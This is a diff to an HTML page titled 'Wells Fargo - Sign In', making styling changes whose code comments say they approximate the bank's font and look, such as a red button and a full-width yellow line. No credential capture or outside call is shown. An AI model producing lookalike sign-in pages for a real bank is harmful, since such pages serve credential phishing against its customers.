@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Wells Fargo - Sign In</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap');
     body {
       font-family: Arial, sans-serif;
       background-color: #fff;
@@ -19,15 +20,15 @@
       padding: 10px;
       text-align: center;
       font-size: 24px;
-      font-weight: bold;
-      font-family: 'Arial Black', sans-serif; /* Approx. Wells Fargo font */
+      font-family: 'Bebas Neue', sans-serif; /* Approx. Wells Fargo Clarendon vibe */
       letter-spacing: 1px;
+      width: 100%;
     }
     .yellow-line {
-      height: 4px;
+      height: 5px;
       background-color: #FFC107;
-      margin: 0 auto;
-      width: 90%;
+      margin: 0;
+      width: 100%;
     }
     .container {
       padding: 20px;
@@ -96,7 +97,7 @@
       margin-bottom: 10px;
     }
     .sign-on-button {
-      background-color: #0057a2;
+      background-color: #c8102e;
       color: #fff;
       border: none;
     }
@@ -104,12 +105,6 @@
       background-color: #fff;
       border: 1px solid #ccc;
       color: #000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .passkey-icon {
-      margin-right: 5px;
     }
     .passkey-text {
       font-size: 12px;
@@ -175,9 +170,7 @@
       <button class="sign-on-button" type="submit">Sign On</button>
     </form>
     <div class="or-text">or</div>
-    <button class="passkey-button">
-      <span class="passkey-icon">🗝️</span>Use a Passkey
-    </button>
+    <button class="passkey-button">Use a Passkey</button>
     <p class="passkey-text">Don't have one? Create a passkey after signing on and skip the password next time.</p>
     <a href="#" class="forgot-link">Forgot username or password?</a>
     <div class="disclosure">
